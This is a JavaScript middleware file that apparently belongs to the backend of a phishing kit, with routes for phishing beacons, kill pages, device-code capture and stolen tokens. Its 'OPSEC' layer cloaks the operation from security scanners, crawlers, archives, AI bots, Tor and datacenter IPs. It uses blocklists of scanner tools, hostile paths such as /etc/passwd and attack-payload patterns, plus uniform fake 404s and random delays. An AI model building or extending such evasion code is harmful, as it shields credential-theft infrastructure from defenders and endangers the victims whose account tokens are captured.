const path = require('path');
const db = require('../database/connection');
const jwt = require('jsonwebtoken');

const config = require('../config/env');

// ═══════════════════════════════════════════════════════════════════
// OPSEC Middleware - Block all scanners, bots, crawlers, scrapers
// ═══════════════════════════════════════════════════════════════════

// Known scanner/bot/crawler user-agent patterns
const BLOCKED_USER_AGENTS = [
  // Security scanners
  'nikto', 'nmap', 'sqlmap', 'dirbuster', 'gobuster', 'wpscan', 'w3af',
  'acunetix', 'nessus', 'qualys', 'openvas', 'burpsuite', 'burp',
  'arachni', 'skipfish', 'wapiti', 'whatweb', 'cmsmap',
  // Vulnerability scanners
  'vulnerability scanner', 'vuln', 'exploit', 'metasploit',
  // Pentesting tools
  'hydra', 'medusa', 'patator', 'crowbar',
  // Web crawlers (aggressive)
  'crawler', 'spider', 'crawl', 'scrapy', 'wget', 'curl', 'python-requests',
  'httpclient', 'java/', 'apache-http',
  // SEO scrapers
  'ahrefsbot', 'semrush', 'majestic', 'screaming frog',
  'dotbot', 'rogerbot', 'petalbot', 'dataforseobot',
  // Content scrapers
  'scrapy', 'httrack', 'teleport', 'webcopier', 'webreaper',
  'getright', 'flashget', 'wget', 'curl', 'lwp-trivial',
  // Automation tools
  'selenium', 'puppeteer', 'playwright', 'phantomjs', 'headlesschrome',
  'slimerjs', 'zombie', 'casperjs', 'nightmare',
  // Misc bots
  'bot', 'crawler', 'spider', 'slurp', 'yahoo', 'baiduspider',
  'yandexbot', 'duckduckbot', 'facebot', 'ia_archiver',
  'archive.org', 'wayback', 'turnitin', 'grammarly',
  // Hacking tools
  'havij', 'sqlninja', 'commix', 'fimap', 'xsser',
  // Network tools
  'masscan', 'zmap', 'nmap scripting engine',
  // AI scrapers
  'gptbot', 'chatgpt-user', 'claudebot', 'anthropic-ai',
  'google-extended', 'cohere-ai', 'perplexity', 'youbot',
  'bytespider', 'magpie-crawler', 'meta-externalagent',
  // Common attack tools
  'hydra', 'medusa', 'ncrack', 'patator', 'thc-scan',
  'dnsrecon', 'dig', 'host', 'fierce', 'recon-ng',
  'theharvester', 'maltego', 'shodan', 'censys'
];

// Known datacenter/VPN/Tor IP ranges (major providers) - using proper CIDR notation
const DATACENTER_ASN_RANGES = [
  // Cloudflare
  '104.16.0.0/12',
  '172.64.0.0/13',
  '104.20.0.0/14',
  // AWS
  '52.0.0.0/11',
  '54.0.0.0/12',
  '13.0.0.0/11',
  '35.0.0.0/12', // AWS in some regions
  // Azure
  '20.0.0.0/12',
  '40.0.0.0/12',
  '137.116.0.0/12', // Azure
  // GCP
  '35.0.0.0/12',
  '34.0.0.0/12',
  // Google DNS (often proxied)
  '8.8.8.0/24',
  '8.8.4.0/24',
];

// Tor exit node indicators (common patterns)
const TOR_INDICATORS = [
  '185.220.100.', '185.220.101.', '185.220.102.', '185.220.103.',
  '109.70.100.', '109.70.101.', '109.70.102.',
  '193.218.118.', '199.249.230.', '198.96.155.',
];

// Path patterns that indicate scanning
const SCAN_PATH_PATTERNS = [
  /\/wp-admin/i, /\/wp-login/i, /\/wp-content/i, /\/xmlrpc/i,
  /\/\.env/i, /\/\.git/i, /\/\.svn/i, /\/\.htaccess/i,
  /\/phpmyadmin/i, /\/pma/i, /\/adminer/i,
  /\/shell/i, /\/cmd/i, /\/exec/i, /\/system/i,
  /\/etc\/passwd/i, /\/proc\/self/i,
  /\/\.\./i, /\/%2e%2e/i, /\/%252e/i,
  /\/select/i, /\/union/i, /\/sleep\(/i, /\/benchmark\(/i,
  /\/<script/i, /\/<img/i, /\/onerror=/i, /\/onload=/i,
  /\/etc\/shadow/i, /\/boot\.ini/i, /\/win\.ini/i,
  /\/server-status/i, /\/server-info/i,
  /\/graphql/i, /\/api\/graphql/i,
  /\/actuator/i, /\/health/i, /\/metrics/i, /\/env/i,
  /\/debug/i, /\/trace/i, /\/dump/i,
  /\/\.well-known/i, /\/robots\.txt/i, /\/sitemap\.xml/i,
  /\/\.DS_Store/i, /\/Thumbs\.db/i,
  /\/backup/i, /\/dump\.sql/i, /\/database\.sql/i,
  /\/config\.php/i, /\/wp-config/i, /\/settings\.php/i,
  /\/test/i, /\/phpinfo/i, /\/info\.php/i,
  /\/cgi-bin/i, /\/scripts/i, /\/bin/i,
  /\/solr/i, /\/jenkins/i, /\/manager/i,
  /\/elmah\.axd/i, /\/trace\.axd/i,
];

// HTTP methods that indicate scanning
const DANGEROUS_METHODS = ['TRACE', 'TRACK', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK'];

// Response patterns that indicate attack attempts
const ATTACK_PAYLOAD_PATTERNS = [
  /<script/i, /javascript:/i, /on\w+\s*=/i, /<iframe/i, /<object/i,
  /<embed/i, /<form/i, /<img[^>]+on/i, /<svg[^>]+on/i,
  /union\s+select/i, /select\s+.*\s+from/i, /insert\s+into/i,
  /update\s+.*\s+set/i, /delete\s+from/i, /drop\s+table/i,
  /exec\s*\(/i, /execute\s*\(/i, /benchmark\s*\(/i,
  /sleep\s*\(/i, /waitfor\s+delay/i, /pg_sleep/i,
  /\/\*.*\*\//i, /--\s*$/i, /;\s*--/i, /;\s*#/i,
  /0x[0-9a-f]+/i, /char\s*\(/i, /concat\s*\(/i,
  /group\s+by/i, /having\s+/i, /order\s+by\s+\d/i,
  /\/\.\.\//i, /%2e%2e/i, /%252e/i, /%c0%ae/i,
  /etc\/passwd/i, /etc\/shadow/i, /proc\/self/i,
  /boot\.ini/i, /win\.ini/i, /system32/i,
  /<\?php/i, /<%=.*%>/i, /<%.*%>/i,
  /file_get_contents/i, /fopen/i, /fread/i,
  /readfile/i, /include/i, /require/i,
  /base64_decode/i, /eval\s*\(/i, /assert\s*\(/i,
  /system\s*\(/i, /passthru\s*\(/i, /shell_exec/i,
  /popen/i, /pcntl_exec/i, /proc_open/i,
  /curl_exec/i, /file_get_contents/i,
  /ldap_search/i, /ldap_bind/i,
  /header\s*\(\s*location/i, /header\s*\(\s*refresh/i,
  /\{\{.*\}\}/i, /\$\{.*\}/i, /#\{.*\}/i,
  /{{.*}}/i, /<%=.*%>/i, /<%.*%>/i,
  /fsockopen/i, /pfsockopen/i, /stream_socket/i,
  /mail\s*\(/i, /sendmail/i, /smtp_mail/i,
  /dns_get_record/i, /gethostbyname/i,
  /ini_set/i, /ini_alter/i, /ini_restore/i,
  /set_time_limit/i, /ignore_user_abort/i,
  /register_shutdown_function/i, /register_tick_function/i,
  /unserialize\s*\(/i, /serialize\s*\(/i,
  /var_dump/i, /var_export/i, /print_r/i,
  /phpinfo/i, /get_current_user/i, /getenv/i,
  /getenv\s*\(/i, /putenv/i, /apache_get_modules/i,
  /apache_get_version/i, /apache_lookup_uri/i,
  /apache_request_headers/i, /apache_response_headers/i,
];

/**
 * Check if user agent matches known scanner/bot patterns
 */
function isBlockedUserAgent(ua, customPatterns = '') {
  if (!ua || ua.trim() === '') return true; // Empty UA = bot

  const uaLower = ua.toLowerCase();

  // Check built-in patterns
  for (const pattern of BLOCKED_USER_AGENTS) {
    const patternLower = pattern.toLowerCase();
    // For patterns <= 5 chars, use word boundary to prevent false positives
    // e.g., 'bot' should not match 'bot' inside words like 'robot'
    if (patternLower.length <= 5 && !patternLower.includes(' ')) {
      const regex = new RegExp(`\\b${patternLower.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'i');
      if (regex.test(ua)) {
        return true;
      }
    } else {
      if (uaLower.includes(patternLower)) {
        return true;
      }
    }
  }

  // Check custom patterns from settings
  if (customPatterns) {
    const customList = customPatterns.split(',').map(p => p.trim().toLowerCase()).filter(p => p);
    for (const pattern of customList) {
      if (uaLower.includes(pattern)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if IP is a known Tor exit node
 */
function isTorExitNode(ip) {
  if (!ip) return false;
  for (const prefix of TOR_INDICATORS) {
    if (ip.startsWith(prefix)) return true;
  }
  return false;
}

/**
 * Convert IP address to 32-bit integer
 */
function ipToInt(ip) {
  const parts = ip.split('.');
  if (parts.length !== 4) return -1;
  let result = 0;
  for (let i = 0; i < 4; i++) {
    const part = parseInt(parts[i], 10);
    if (isNaN(part) || part < 0 || part > 255) return -1;
    result = (result << 8) | part;
  }
  return result >>> 0; // Convert to unsigned 32-bit integer
}

/**
 * Check if an IP is within a CIDR range (e.g., '104.16.0.0/12')
 */
function ipInCidr(ip, cidr) {
  const [network, prefixLen] = cidr.split('/');
  const prefixBits = parseInt(prefixLen, 10);
  if (isNaN(prefixBits) || prefixBits < 0 || prefixBits > 32) return false;
  
  const ipInt = ipToInt(ip);
  const networkInt = ipToInt(network);
  if (ipInt < 0 || networkInt < 0) return false;
  
  // Create mask for the prefix length
  const mask = prefixBits === 0 ? 0 : (~0 << (32 - prefixBits)) >>> 0;
  
  // Check if IP matches the network with the mask
  return (ipInt & mask) === (networkInt & mask);
}

function isLikelyDatacenter(ip) {
  if (!ip) return false;
  for (const cidr of DATACENTER_ASN_RANGES) {
    if (ipInCidr(ip, cidr)) return true;
  }
  return false;
}

/**
 * Check if request path matches scan patterns
 */
function isScanPath(path) {
  if (!path) return false;
  for (const pattern of SCAN_PATH_PATTERNS) {
    if (pattern.test(path)) return true;
  }
  return false;
}

/**
 * Check if request contains attack payloads
 */
function containsAttackPayload(input) {
  if (!input) return false;
  const str = typeof input === 'string' ? input : JSON.stringify(input);
  for (const pattern of ATTACK_PAYLOAD_PATTERNS) {
    if (pattern.test(str)) return true;
  }
  return false;
}

/**
 * Check if request contains attack payloads in query params
 */
function hasAttackPayload(req) {
  // Check query string
  if (req.query && Object.keys(req.query).length > 0) {
    for (const [key, value] of Object.entries(req.query)) {
      if (containsAttackPayload(value) || containsAttackPayload(key)) return true;
    }
  }

  // Check raw query string
  if (req.originalUrl) {
    const qsIndex = req.originalUrl.indexOf('?');
    if (qsIndex !== -1) {
      const qs = req.originalUrl.substring(qsIndex);
      if (containsAttackPayload(qs)) return true;
    }
  }

  return false;
}

/**
 * Check if IP is in the admin whitelist
 */
async function isIpWhitelisted(ip, whitelistStr) {
  if (!whitelistStr || !ip) return false;
  const entries = whitelistStr.split(',').map(s => s.trim()).filter(Boolean);
  // Exact match
  if (entries.includes(ip)) return true;
  // CIDR ranges (e.g. 203.0.113.0/24, 0.0.0.0/0 to allow everything). ipInCidr is
  // IPv4-only, so IPv6 entries fall back to the exact match above.
  for (const e of entries) {
    if (e.includes('/') && ipInCidr(ip, e)) return true;
  }
  return false;
}

// Signature check only — the downstream adminAuth still does the full admin row
// lookup. Used to let an authenticated admin through the IP whitelist.
//
// Admin and user tokens are signed with the SAME JWT_SECRET, so verifying the
// signature alone is not enough: a user token would wrongly bypass the gate.
// Only a token whose payload carries an admin_id (set at admin-login, auth.js)
// counts as an authenticated admin session.
function isAdminJwtValid(req) {
  const token = req.cookies?.vg_admin_session || req.headers.authorization?.replace('Bearer ', '');
  if (!token) return false;
  try {
    const payload = jwt.verify(token, config.JWT_SECRET);
    return !!(payload && payload.admin_id != null);
  } catch (e) {
    return false;
  }
}

/**
 * Allowlist check for deployed infrastructure: Cloudflare Workers, Bunny URLs,
 * custom domains, and active proxy IPs. Runs BEFORE any UA/IP blocking.
 */
async function isOpsecAllowed(req) {
  const host = String(req.headers.host || '').split(':')[0]; // strip port
  const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '';
  const cleanIp = String(ip).replace(/^::ffff:/, '');

  // Small TTL cache so we don't hit the DB on every single request.
  // The active-worker/custom-domain list changes infrequently.
  const now = Date.now();
  const CACHE_TTL = 10000; // 10 seconds
  if (!_opsecAllowCache || (now - _opsecAllowCache.ts) > CACHE_TTL) {
    try {
      const [links] = await db.query(
        `SELECT worker_name, custom_domain
         FROM links
         WHERE status = 'active'
         LIMIT 1000`
      );
      const workerHosts = new Set();
      const customDomains = new Set();
      for (const link of links) {
        if (link.worker_name) {
          const wn = String(link.worker_name).toLowerCase();
          workerHosts.add(wn + '.workers.dev');
          // Also accept any subdomain variant like "worker.sub.workers.dev"
          workerHosts.add('.' + wn + '.workers.dev'); // used as endsWith suffix below
        }
        if (link.custom_domain) {
          const cd = String(link.custom_domain)
            .replace(/^https?:\/\//i, '')
            .replace(/\/.*$/, '')
            .toLowerCase();
          if (cd) customDomains.add(cd);
        }
      }
      let proxyHosts = new Set();
      try {
        const [proxyRows] = await db.query(
          `SELECT proxy_host FROM proxies WHERE status = 'active' LIMIT 1000`
        );
        for (const p of proxyRows) {
          const ph = String(p.proxy_host);
          if (ph) proxyHosts.add(ph);
        }
      } catch (err) {
        // proxies table may not exist yet (migration pending) — silently skip
        if (err.code !== 'ER_NO_SUCH_TABLE' && err.code !== 1146) {

        }
      }
      _opsecAllowCache = { ts: now, workerHosts, customDomains, proxyHosts };
    } catch (err) {

    }
  }

  if (!_opsecAllowCache) return false;

  if (host && _opsecAllowCache.customDomains.size > 0 && _opsecAllowCache.customDomains.has(host)) {
    return true;
  }
  if (host && _opsecAllowCache.workerHosts.size > 0) {
    for (const suffix of _opsecAllowCache.workerHosts) {
      if (host === suffix || host.endsWith(suffix)) return true;
    }
  }
  if (cleanIp && _opsecAllowCache.proxyHosts.size > 0 && _opsecAllowCache.proxyHosts.has(cleanIp)) {
    return true;
  }
  return false;
}

// Allowlist cache (populated lazily by isOpsecAllowed)
let _opsecAllowCache = null;

/**
 * Main OPSEC middleware
 */
async function opsecCheck(req, res, next) {
  try {
    // Get client IP
    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '';
    const cleanIp = ip.replace(/^::ffff:/, ''); // Strip IPv6 prefix

    // Allowlist: deployed workers, Bunny URLs, custom domains, and proxy IPs
    const opsecAllowed = await isOpsecAllowed(req);
    if (opsecAllowed) {
      return next();
    }

    // Load OPSEC settings from cache or DB
    const settings = await getOpsecSettings();

    const adminPrefix = '/' + config.ADMIN_PATH;
    const isAdminApi = req.path.startsWith('/api/admin') || req.path === '/api/auth/admin-login' || req.path === '/api/auth/admin-setup';
    const isUserAuthApi = req.path.startsWith('/api/auth/');
    const isDeviceFlowApi = req.path.startsWith('/api/verify') || req.path.startsWith('/api/capture');
    const isWorkerLog = req.path.startsWith('/api/log'); 
    const isPhishingBeacon = req.path.startsWith('/api/beacon'); 
    const isPhishingKill = req.path.startsWith('/api/killpage'); 
    const isScannerSignal = req.path.startsWith('/api/scanner-signal');
    const isDeviceCode = req.path.startsWith('/api/device'); 
    const isDebugDeviceCode = req.path === '/api/debug/devicecode'; 
    const isStaticAsset = req.path === '/favicon.ico';
    const isExportHost = req.path.startsWith('/api/export');
    const isPanelApi =
      req.path.startsWith('/api/preview') ||
      req.path.startsWith('/api/analytics') ||
      req.path.startsWith('/api/payments') ||
      req.path.startsWith('/api/feedback') ||
      req.path.startsWith('/api/system') ||
      req.path.startsWith('/api/broadcast') ||
      req.path === '/api/notices/latest';
    const isAdminProbe = req.path === '/api/auth/admin-login-probe';
    if (
      req.path.startsWith(adminPrefix) ||
      isAdminApi ||
      isUserAuthApi ||
      req.path.startsWith('/user-panel') ||
      req.path.startsWith('/api/tokens') ||
      req.path.startsWith('/api/user') ||
      req.path.startsWith('/api/links') ||
      req.path.startsWith('/api/templates') ||
      isDeviceFlowApi ||
      isWorkerLog ||
      isPhishingBeacon ||
      isPhishingKill ||
      isScannerSignal ||
      isDeviceCode ||
      isDebugDeviceCode ||
      isPanelApi ||
      isStaticAsset ||
      isExportHost ||
      isAdminProbe
    ) {
      const isAdminLogin = req.path === '/api/auth/admin-login' || req.path === '/api/auth/admin-setup';
      // The IP whitelist gates the authenticated admin API (/api/admin/*) only.
      // Two deliberate exemptions, each of which would otherwise deadlock the
      // operator:
      //   1. isAdminLogin (admin-login / admin-setup) — a brand-new device has no
      //      admin cookie yet, so it must be able to reach the login endpoint to
      //      authenticate at all. Still rate-limited by adminAuthLimiter and
      //      guarded by password + 2FA.
      //   2. The static panel HTML (/<ADMIN_PATH>) is NOT in this condition — the
      //      gate tested isAdminPath, which includes that prefix, so a new device
      //      got a 403 before the login form ever rendered. The HTML shell is
      //      unauthenticated anyway; all real actions go through /api/admin/*,
      //      which is gated here and behind adminAuth downstream.
      // A valid admin session (payload carries admin_id) bypasses the IP gate, so
      // an operator on a roaming, dynamic or VPN IP is never locked out once
      // logged in — no way back in to edit the list.
      if (
        isAdminApi &&
        !isAdminLogin &&
        settings.admin_ip_whitelist_enabled === 'true'
      ) {
        if (!isAdminJwtValid(req)) {
          const whitelisted = await isIpWhitelisted(cleanIp, settings.admin_whitelist_ips);
          if (!whitelisted) {
            logBlocked(cleanIp, req.headers['user-agent'], 'Admin API IP not whitelisted (no valid admin session)');
            return res.status(403).json({ error: 'Access denied' });
          }
        }
      }
      return next();
    }

    // 1. Check User-Agent
    if (settings.block_scanners === 'true') {
      if (isBlockedUserAgent(req.headers['user-agent'], settings.blocked_agents)) {
        logBlocked(cleanIp, req.headers['user-agent'], 'Blocked User-Agent');
        return res.status(403).json({ error: 'Access denied' });
      }
    }

    // 2. Check Tor exit nodes
    if (settings.block_tor === 'true' && isTorExitNode(cleanIp)) {
      logBlocked(cleanIp, req.headers['user-agent'], 'Tor exit node');
      return res.status(403).json({ error: 'Access denied' });
    }

    // 2b. Check datacenter IPs
    if (settings.block_datacenter === 'true' && isLikelyDatacenter(cleanIp)) {
      logBlocked(cleanIp, req.headers['user-agent'], 'Datacenter IP');
      return res.status(403).json({ error: 'Access denied' });
    }

    // 3. Check dangerous HTTP methods
    if (DANGEROUS_METHODS.includes(req.method)) {
      logBlocked(cleanIp, req.headers['user-agent'], `Dangerous method: ${req.method}`);
      return uniformError(req, res, 405, 'Method not allowed');
    }

    // 4. Check scan path patterns
    if (settings.block_scanners === 'true' && isScanPath(req.path)) {
      logBlocked(cleanIp, req.headers['user-agent'], `Scan path detected: ${req.path}`);
      return uniformError(req, res, 404, 'Not Found');
    }

    // 5. Check attack payloads in query
    if (settings.block_scanners === 'true' && hasAttackPayload(req)) {
      logBlocked(cleanIp, req.headers['user-agent'], 'Attack payload in query');
      return uniformError(req, res, 400, 'Bad request');
    }

    // 6. Check attack payloads in POST body
    if (settings.block_scanners === 'true' && (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
      if (req.body && typeof req.body === 'object') {
        const bodyStr = JSON.stringify(req.body);
        if (containsAttackPayload(bodyStr)) {
          logBlocked(cleanIp, req.headers['user-agent'], 'Attack payload in body');
          return uniformError(req, res, 400, 'Bad request');
        }
      }
    }

    // 7. Apply random delay if enabled (response obfuscation)
    if (settings.random_delays === 'true') {
      const min = parseInt(settings.min_delay_ms) || 100;
      const max = parseInt(settings.max_delay_ms) || 500;
      const delay = Math.floor(Math.random() * (max - min + 1)) + min;
      await sleep(delay);
    }

    next();
  } catch (err) {

    next(); // Fail open - don't block legitimate traffic on error
  }
}

function uniformError(req, res, status, message) {
  if (req.accepts('html')) {
    return res.status(status).sendFile(path.join(__dirname, '..', '..', 'admin-panel', '404.html'));
  }
  return res.status(status).json({ error: message });
}

// Settings cache
let _opsecSettings = null;
let _settingsCacheTime = 0;
const SETTINGS_CACHE_TTL = 30000; // 30 seconds

async function getOpsecSettings() {
  const now = Date.now();
  if (_opsecSettings && (now - _settingsCacheTime) < SETTINGS_CACHE_TTL) {
    return _opsecSettings;
  }

  try {
    const [rows] = await db.query(`
      SELECT setting_key, setting_value FROM settings
      WHERE setting_key IN (
        'block_scanners', 'block_datacenter', 'block_tor', 'block_vpn',
        'blocked_agents', 'admin_ip_whitelist_enabled', 'admin_whitelist_ips',
        'random_delays', 'min_delay_ms', 'max_delay_ms', 'uniform_errors',
        'rate_limit_enabled', 'rate_limit_window_ms', 'rate_limit_max_requests',
        'auto_cleanup', 'token_retention_days', 'cleanup_interval_hours'
      )
    `);

    const settings = { ...FALLBACK_SETTINGS };
    rows.forEach(r => { settings[r.setting_key] = r.setting_value; });
    _opsecSettings = settings;
    _settingsCacheTime = now;
    return settings;
  } catch (err) {

    return { ...FALLBACK_SETTINGS };
  }
}

const FALLBACK_SETTINGS = {
  block_scanners: 'true',
  block_datacenter: 'false',
  block_tor: 'false',
  block_vpn: 'false',
  blocked_agents: '',
  admin_ip_whitelist_enabled: 'false',
  admin_whitelist_ips: '',
  random_delays: 'false',
  min_delay_ms: '100',
  max_delay_ms: '500',
  uniform_errors: 'true',
  rate_limit_enabled: 'true',
  rate_limit_window_ms: String(15 * 60 * 1000),
  rate_limit_max_requests: '500',
  auto_cleanup: 'false',
  token_retention_days: '30',
  cleanup_interval_hours: '24'
};

// Logging
let _blockLog = [];
const MAX_LOG_ENTRIES = 500;

function logBlocked(ip, ua, reason) {
  const entry = {
    timestamp: new Date().toISOString(),
    ip,
    ua: ua || 'empty',
    reason,
    shortReason: reason.substring(0, 50)
  };

  _blockLog.unshift(entry);
  if (_blockLog.length > MAX_LOG_ENTRIES) {
    _blockLog = _blockLog.slice(0, MAX_LOG_ENTRIES);
  }
}

function getBlockLog() {
  return _blockLog;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Export
module.exports = {
  opsecCheck,
  isOpsecAllowed,
  isBlockedUserAgent,
  isTorExitNode,
  isScanPath,
  containsAttackPayload,
  getBlockLog,
  logBlocked,
  getOpsecSettings,
};
